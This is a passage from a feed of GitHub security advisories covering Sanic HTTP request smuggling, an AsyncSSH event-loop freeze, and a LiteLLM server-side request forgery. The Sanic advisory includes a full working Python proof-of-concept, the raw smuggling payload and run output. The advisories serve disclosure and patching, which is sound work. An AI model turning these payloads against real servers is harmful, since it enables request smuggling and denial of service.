<li><a href="https://github.com/sanic-org/sanic/releases/tag/v24.12.1">https://github.com/sanic-org/sanic/releases/tag/v24.12.1</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v25.12.1">https://github.com/sanic-org/sanic/releases/tag/v25.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/advisories/GHSA-wmj6-g64g-j7q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:59:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanic] sanic chunked trailer request smuggling allows hidden second request execution]]></title>
        <id>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</id>
        <link href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5"/>
        <updated>2026-09-17T14:59:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Sanic's HTTP/1.1 chunked-body handling does not fully consume the <code>trailer-part</code> after the terminating <code>0\r\n</code> chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer <code>POST /</code> request that correctly returns <code>405 Method Not Allowed</code> is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.</p>
<p>The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected <code>405</code> for the outer <code>POST /</code>, then a separate <code>200 OK</code> for a hidden <code>GET /</code>. A second exploit variant changes the hidden request path and receives a real <code>404 Not Found</code>, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from <code>GET</code> to <code>:GET</code>, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.</p>
<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
<ol>
<li>Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on <code>127.0.0.1:9381</code> and the root route allowed <code>GET /</code> but not <code>POST /</code>.</li>
<li>From the package root, run the provided PoC:</li>
</ol>
<pre><code class="language-bash">python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
</code></pre>
<ol start="3">
<li>Review the baseline case in <code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>. A normal chunked request with <code>0\r\n\r\n</code> returns exactly one response block:</li>
</ol>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
HTTP/1.1 405 Method Not Allowed
</code></pre>
<ol start="4">
<li>Review the exploit case that hides <code>GET /</code> in the trailer area:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
</code></pre>
<p>The PoC sends a single TCP payload containing:</p>
<pre><code class="language-text">POST / HTTP/1.1
Host: 127.0.0.1:9381
Connection: keep-alive
Transfer-Encoding: chunked

1
X
0
a:GET / HTTP/1.1
Host: 127.0.0.1:9381
</code></pre>
<ol start="5">
<li>Confirm that Sanic returns two response blocks from that one send:</li>
</ol>
<pre><code class="language-text">Received response blocks: 2
HTTP/1.1 405 Method Not Allowed
...
HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<ol start="6">
<li>Review the second exploit case that changes the smuggled request path to a nonexistent route:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
</code></pre>
<p>Confirm that Sanic again returns two response blocks and that the second response is a real routed <code>404 Not Found</code> for the attacker-controlled hidden path.
7. Review the control case with a two-character trailer field name:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
</code></pre>
<p>Confirm that the second request is now interpreted as <code>:GET /</code>, producing a second <code>405</code> with <code>Method :GET not allowed for URL /</code>. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.</p>
<h2 id="recommendations">Recommendations</h2>
<p>After parsing the terminating <code>0</code> chunk, Sanic must continue parsing and fully consuming the <code>trailer-part</code> until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating <code>0\r\n</code> other than the expected final empty line, and then close the connection instead of keeping it alive.</p>
<p>Add regression coverage for all three cases shown in the evidence: a normal <code>0\r\n\r\n</code> chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.</p>
<h2 id="poc">poc</h2>
<pre><code class="language-python">#!/usr/bin/env python3
"""Proof of concept for HTTP/1.1 chunked trailer request injection."""

from __future__ import annotations

import socket
from dataclasses import dataclass
from typing import Iterable


TARGET = "sanic-org/sanic"
BASE_URL = "http://127.0.0.1:9381"
HOST = "127.0.0.1"
PORT = 9381
TIMEOUT = 1.0
PROXY = None
AUTH_HEADERS: dict[str, str] = {}


@dataclass
class Case:
    name: str
    payload: bytes
    expected_responses: int
    expected_markers: tuple[bytes, ...]


def build_prefix() -&gt; bytes:
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"Connection: keep-alive\r\n"
        + b"Transfer-Encoding: chunked\r\n"
        + b"\r\n"
        + b"1\r\n"
        + b"X\r\n"
    )


def build_case_payload(path: str | None = None, field_name: str = "a") -&gt; bytes:
    prefix = build_prefix()
    if path is None:
        return prefix + b"0\r\n\r\n"
    return (
        prefix
        + b"0\r\n"
        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"\r\n"
    )


def send_payload(payload: bytes) -&gt; bytes:
    response = bytearray()
    with socket.create_connection((HOST, PORT), timeout=3) as sock:
        sock.sendall(payload)
        sock.settimeout(TIMEOUT)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def count_http_responses(response: bytes) -&gt; int:
    return response.count(b"HTTP/1.1 ")


def ensure_markers(case: Case, response: bytes) -&gt; None:
    actual_count = count_http_responses(response)
    if actual_count != case.expected_responses:
        raise SystemExit(
            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
        )
    for marker in case.expected_markers:
        if marker not in response:
            raise SystemExit(
                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
            )


def render_payload(payload: bytes) -&gt; str:
    return payload.decode("latin1", "replace")


def render_response(response: bytes) -&gt; str:
    return response.decode("latin1", "replace")


def iter_cases() -&gt; Iterable[Case]:
    yield Case(
        name="baseline_no_trailer",
        payload=build_case_payload(),
        expected_responses=1,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method POST not allowed for URL /",
        ),
    )
    yield Case(
        name="exploit_smuggled_root",
        payload=build_case_payload("/"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 200 OK",
            b'{"test":true}',
        ),
    )
    yield Case(
        name="exploit_smuggled_404",
        payload=build_case_payload("/this-path-should-not-exist"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 404 Not Found",
            b"Requested URL /this-path-should-not-exist not found",
        ),
    )
    yield Case(
        name="offset_control_two_char_field_name",
        payload=build_case_payload("/", field_name="ab"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method :GET not allowed for URL /",
        ),
    )


def main() -&gt; None:
    print(f"Target: {TARGET}")
    print(f"Base URL: {BASE_URL}")
    print()
    for case in iter_cases():
        print(f"=== CASE: {case.name} ===")
        print("Sent payload:")
        print(render_payload(case.payload))
        response = send_payload(case.payload)
        ensure_markers(case, response)
        print(f"Received response blocks: {count_http_responses(response)}")
        print("Raw response:")
        print(render_response(response))
        print("[OK] Case verified")
        print()


if __name__ == "__main__":
    main()
</code></pre>
<h2 id="evidence-files">Evidence Files</h2>
<p>The attachment package includes the exact PoC and the full runtime output from the verified local execution.</p>
<ul>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.py</code>: full PoC used for the verified run.</li>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>: runtime output showing the baseline behavior, the successful smuggled <code>GET /</code> execution, the successful smuggled <code>GET /this-path-should-not-exist</code> execution, and the trailer-offset control case.</li>
</ul>
<p>Observed baseline behavior:</p>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /
</code></pre>
<p>Observed hidden second request execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<p>Observed hidden attacker-controlled path execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 404 Not Found
...
Requested URL /this-path-should-not-exist not found
</code></pre>
<p>Observed trailer-offset control:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 405 Method Not Allowed
...
Method :GET not allowed for URL /
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.</p>
<p>This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3164">https://github.com/sanic-org/sanic/pull/3164</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3165">https://github.com/sanic-org/sanic/pull/3165</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22">https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea">https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6">https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v24.12.1">https://github.com/sanic-org/sanic/releases/tag/v24.12.1</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v25.12.1">https://github.com/sanic-org/sanic/releases/tag/v25.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/advisories/GHSA-wmj6-g64g-j7q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:59:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncssh] AsyncSSH: asyncio event-loop freeze via SSH maximum packet size = 0 in SSH_MSG_CHANNEL_OPEN / OPEN_CONFIRMATION]]></title>
        <id>https://github.com/advisories/GHSA-rw4j-r22c-9gc3</id>
        <link href="https://github.com/advisories/GHSA-rw4j-r22c-9gc3"/>
        <updated>2026-09-17T14:53:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A malicious SSH server can wedge an AsyncSSH <strong>client</strong>, and an authenticated
client can wedge an AsyncSSH <strong>server</strong>, by sending a channel <code>maximum packet size</code> of <code>0</code> in <code>SSH_MSG_CHANNEL_OPEN_CONFIRMATION</code> (server→client) or
<code>SSH_MSG_CHANNEL_OPEN</code> (client→server). AsyncSSH stores the peer-supplied value
verbatim with no lower-bound check; the first time channel data is written,
<code>SSHChannel._flush_send_buf</code> enters a <strong>synchronous infinite loop</strong> that cannot
be interrupted by <code>asyncio.wait_for</code> or any timeout. The loop body has no
<code>await</code>, so it blocks the entire asyncio event loop — for a server, one
malicious authenticated channel freezes <strong>all</strong> current and future connections.</p>
<p>RFC 4254 §5.1 leaves receiver behavior for a peer-reported "maximum packet
size = 0" undefined, so the value must be rejected rather than stored.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>asyncssh/channel.py</code>:</p>
<pre><code class="language-python"># process_open (server side)        -- line 465
self._send_pktsize = send_pktsize    # peer value, no &gt;= 1 check

# process_open_confirmation (client) -- line 528
self._send_pktsize = send_pktsize    # peer value, no &gt;= 1 check

# _flush_send_buf                    -- lines 305-320
while self._send_buf and self._send_window:
    pktsize = min(self._send_window, self._send_pktsize)  # 0 when peer sends 0
    buf, datatype = self._send_buf[0]
    if len(buf) &gt; pktsize:          # True for any buffered data
        data = buf[:pktsize]        # empty (b'')
        del buf[:pktsize]           # no-op
    ...
    self._send_window -= len(data)  # -= 0, unchanged
</code></pre>
<p>With <code>_send_pktsize == 0</code>, <code>pktsize</code> is <code>0</code>, so <code>buf[:0]</code> is empty,
<code>del buf[:0]</code> is a no-op, and <code>_send_window</code> is never decremented — the
<code>while</code> condition is permanently true, and with no <code>await</code> in the body the
event loop is blocked.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Client vector (primary):</strong> a malicious SSH server replies to the client's
channel open with <code>maximum packet size = 0</code>; the client wedges on its first
channel write. The attacker is the server, so it needs no valid credentials.</li>
<li><strong>Server vector:</strong> an authenticated client opens a channel with
<code>maximum packet size = 0</code>; any server-side channel write wedges the AsyncSSH
server's event loop, freezing <strong>every</strong> current and future connection. A
single low-privilege account can take the whole server down.</li>
</ul>
<p>Both vectors are a single SSH message, deterministic, and cause total
availability loss for the affected process.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>&lt;= 2.23.1 (latest release, 2026-06-06); also present on <code>master</code>
(channel.py:465/528 unguarded). Verified end-to-end on 2.23.1.</p>
<h2 id="verification">Verification</h2>
<p>The maintainer's proposed fix (reject <code>send_pktsize == 0</code> in <code>connection.py</code>
<code>_process_channel_open</code> / <code>_process_channel_open_confirmation</code>) was applied to
2.23.1 and re-tested end-to-end over TCP:</p>
<ul>
<li><strong>Unpatched:</strong> malicious server (paramiko forcing <code>max_packet_size=0</code> in
OPEN_CONFIRMATION) + real asyncssh client → client event loop wedges.</li>
<li><strong>Patched:</strong> the guard fires inside <code>_process_channel_open_confirmation</code>, the
malicious value is rejected, the connection closes cleanly
(<code>ChannelOpenError: SSH connection closed</code>), and the client does <strong>not</strong> wedge.</li>
</ul>
<p>The maintainer (Ron Frederick) independently confirmed the freeze and noted that
<strong>even shutting the server down does not break clients out of the loop</strong>.</p>
<p>Reproducers available: a focused harness driving the real
<code>SSHChannel._flush_send_buf</code> with <code>_send_pktsize=0</code>, and an end-to-end
<code>malicious_server.py</code> (paramiko) + <code>client.py</code> (real asyncssh) pair. The
end-to-end client repro uses <code>asyncio.new_event_loop()</code> (not <code>get_event_loop()</code>)
for Python 3.14 compatibility.</p>
<h2 id="suggested-fix-maintainers-approach">Suggested fix (maintainer's approach)</h2>
<p>In <code>connection.py</code>, after each <code>send_pktsize = packet.get_uint32()</code> in
<code>_process_channel_open</code> and <code>_process_channel_open_confirmation</code>:</p>
<pre><code class="language-python">if send_pktsize == 0:
    raise ProtocolError('Invalid maximum packet size')
</code></pre>
<h2 id="cvss">CVSS</h2>
<p><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code> (6.5 Medium). An earlier draft
quoted 7.5 High ("100% CPU"); the synchronous loop burns ~100% of one core's
worth of CPU but, being single-threaded, the OS scheduler spreads it across
cores, so the real impact is event-loop / connection freeze, not machine-wide
CPU exhaustion.</p>
<h2 id="references">References</h2>
<ul>
<li>RFC 4254 §5.1 (channel "maximum packet size"; behavior for 0 is undefined).</li>
<li>The same <code>maximum packet size = 0</code> send-loop wedge was confirmed in several
other independent SSH implementations (different languages/runtimes) and
reported to each maintainer separately.</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Reported by zhangph (afldl), 2026-06-20.</p>
<pre><code>### References

- &lt;https://github.com/ronf/asyncssh/security/advisories/GHSA-rw4j-r22c-9gc3&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-62949&gt;
- &lt;https://github.com/ronf/asyncssh/commit/756cbae5350789ce9735f15f704bae9b5a3608b8&gt;
- &lt;https://github.com/ronf/asyncssh/commit/9c354270c009285525e126721e8ed5fbed1f8a67&gt;
- &lt;https://github.com/ronf/asyncssh/releases/tag/v2.24.0&gt;
- &lt;https://github.com/advisories/GHSA-rw4j-r22c-9gc3&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rw4j-r22c-9gc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:53:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM Proxy has server-side request forgery via the `user_config` request parameter]]></title>
        <id>https://github.com/advisories/GHSA-hx8v-g79f-8w5f</id>
        <link href="https://github.com/advisories/GHSA-hx8v-g79f-8w5f"/>
        <updated>2026-09-17T14:51:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A server-side request forgery in LiteLLM Proxy lets an authenticated caller redirect the
proxy's outbound request to a host of their choosing by smuggling an <code>api_base</code> inside the
<code>user_config</code> request body, bypassing the existing parameter guard.</p>
<h3 id="details">Details</h3>
<p>LiteLLM Proxy validates request bodies with <code>is_request_body_safe</code>, which blocks the
<code>api_base</code> and <code>base_url</code> parameters but does not cover <code>user_config</code>. The <code>user_config</code>
object is used to build the outbound router for a request, so a caller can place an
<code>api_base</code> inside it and reach an arbitrary host. The guard only inspected the two
top-level keys, so the same <code>api_base</code> nested inside <code>user_config</code> was never checked.</p>
<p>Exploitation requires a valid virtual key.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated caller can make the proxy issue server-side requests to internal or
external hosts of their choosing, reaching endpoints the caller cannot otherwise access.</p>
<h3 id="affected--patched">Affected / Patched</h3>
<p>Affected: <code>&lt;= 1.83.8</code>
Patched: <code>1.83.9</code></p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to 1.83.9 or later (released 2026-04-17).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-hx8v-g79f-8w5f">https://github.com/BerriAI/litellm/security/advisories/GHSA-hx8v-g79f-8w5f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59823">https://nvd.nist.gov/vuln/detail/CVE-2026-59823</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/25827">https://github.com/BerriAI/litellm/pull/25827</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/47214be317f45a2d2ac08258362e0481411eb427">https://github.com/BerriAI/litellm/commit/47214be317f45a2d2ac08258362e0481411eb427</a></li>
<li><a href="https://github.com/advisories/GHSA-hx8v-g79f-8w5f">https://github.com/advisories/GHSA-hx8v-g79f-8w5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx8v-g79f-8w5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:51:21.000Z</published>
    </entry>
</feed>